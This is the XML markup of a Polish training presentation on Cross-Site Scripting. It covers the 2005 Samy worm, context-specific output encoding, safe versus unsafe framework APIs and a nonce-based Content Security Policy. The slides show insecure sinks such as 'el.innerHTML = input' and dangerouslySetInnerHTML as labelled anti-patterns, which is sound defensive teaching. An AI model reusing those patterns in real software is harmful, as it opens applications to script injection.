          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7224"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E0DDD4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8218984" y="3671193"/>
            <a:ext cx="298686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Samorozprzestrzenianie</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8218984" y="4021634"/>
            <a:ext cx="298686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D55"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Robaki XSS kopiujące się do kolejnych profili</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14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C4561F"/>
        </a:solidFill>
        <a:effectLst/>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name=""/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="162321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FBE3D2"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>PRZYKŁAD Z HISTORII · MYSPACE, 2005</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="2176859"/>
            <a:ext cx="10883392"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FBF6F0"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>1 000 000+</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="3751659"/>
            <a:ext cx="9810750" cy="1305322"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="3360"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FBF6F0"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>profili zainfekował robak „Samy” w niespełna dobę – stored XSS, który kopiował się do profilu każdej odwiedzającej osoby.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="28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BE3D2"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Cross-Site Scripting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C4561F"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>OBRONA 1 · KODOWANIE WYJŚCIA</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="11378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Koduj dane tam, gdzie je wstawiasz</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02321"/>
          <a:ext cx="10553700" cy="3382566"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="3517900">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20000"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3517900">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20001"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3517900">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20002"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="439341">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0">
                        <a:lnSpc>
                          <a:spcPts val="1960"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="4A4D55"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Kontekst</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nSpc>
                          <a:spcPts val="1960"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="4A4D55"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Przykład</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="88900" marB="8890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nSpc>
                          <a:spcPts val="1960"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="4A4D55"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Co zrobić</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="IBM Plex Sans" charset="0"/>
                        <a:ea typeface="IBM Plex Sans" charset="0"/>
                        <a:cs typeface="IBM Plex Sans" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="152400" marR="152400" marT="88900" marB="8890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439341">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0">
                        <a:lnSpc>
                          <a:spcPts val="1960"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B1D22"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Treść HTML</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B1D22"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>&lt;p&gt;DANE&lt;/p&gt;</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B1D22"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Encje HTML: &amp; &lt; &gt; " '</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1"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="688181">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0">
                        <a:lnSpc>
                          <a:spcPts val="1960"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B1D22"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Atrybut HTML</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B1D22"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>&lt;input value="DANE"&gt;</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B1D22"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Encje + zawsze cudzysłów wokół wartości</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2"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="688181">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0">
                        <a:lnSpc>
                          <a:spcPts val="1960"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B1D22"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>URL</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B1D22"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>&lt;a href="DANE"&gt;</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B1D22"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>encodeURIComponent + tylko http(s), blokuj javascript:</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3"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="688181">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0">
                        <a:lnSpc>
                          <a:spcPts val="1960"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B1D22"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>JavaScript</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B1D22"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>&lt;script&gt;var x='DANE'&lt;/script&gt;</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B1D22"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Unikaj; przekaż jako JSON w atrybucie data-*</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4"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="439341">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr marL="0" indent="0">
                        <a:lnSpc>
                          <a:spcPts val="1960"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1B1D22"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>CSS</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B1D22"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>style="color: DANE"</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B1D22"/>
                          </a:solidFill>
                          <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                          <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Unikaj; tylko wartości z białej listy</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12 · Więcej: OWASP XSS Prevention Cheat Sheet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C4561F"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>OBRONA 2 · FRAMEWORKI I BEZPIECZNE API</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="11378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Pozwól frameworkowi kodować za ciebie</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1889621"/>
            <a:ext cx="5181600" cy="1731963"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5866"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="15171C"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2143621"/>
            <a:ext cx="481380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8A4B"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>✗ Niebezpieczne</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2468662"/>
            <a:ext cx="481380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el.innerHTML = input;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2793702"/>
            <a:ext cx="481380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dangerouslySetInnerHTML</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="3118743"/>
            <a:ext cx="481380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v-html · [innerHTML] · |safe</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6197600" y="1889621"/>
            <a:ext cx="5181600" cy="1731963"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5866"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="15171C"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6451600" y="2143621"/>
            <a:ext cx="481380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7FB3EA"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>✓ Bezpieczne</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6451600" y="2468662"/>
            <a:ext cx="481380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el.textContent = input;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6451600" y="2793702"/>
            <a:ext cx="481380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&lt;p&gt;{input}&lt;/p&gt; // React</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6451600" y="3118743"/>
            <a:ext cx="481380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DOMPurify.sanitize(html)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="3926384"/>
            <a:ext cx="9810750" cy="90914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1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>React, Angular, Vue i nowoczesne silniki szablonów domyślnie kodują dane. Większość współczesnych XSS powstaje tam, gdzie świadomie </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>wyłączamy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1B1D22"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> tę ochronę. Gdy musisz wyświetlić HTML od użytkownika – sanityzuj go biblioteką, nie regexem.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="16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C4561F"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>OBRONA 3 · CONTENT SECURITY POLICY</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="11378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CSP: przeglądarka wykonuje tylko zaufane skrypty</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1889621"/>
            <a:ext cx="10566400" cy="2057003"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4939"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="15171C"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="pl-PL"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1117600" y="2143621"/>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E8B84"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t># nagłówek odpowiedzi HTTP (nonce losowany przy każdym żądaniu)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1117600" y="2468662"/>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Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic';</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1117600" y="2793702"/>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  object-src 'none'; base-uri 'none'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1117600" y="3118743"/>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7FB3EA"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>&lt;script nonce="r4nd0m" src="/app.js"&gt;&lt;/script&gt; ✓ wykona się</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1117600" y="3443784"/>
            <a:ext cx="1025550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8A4B"/>
                </a:solidFill>
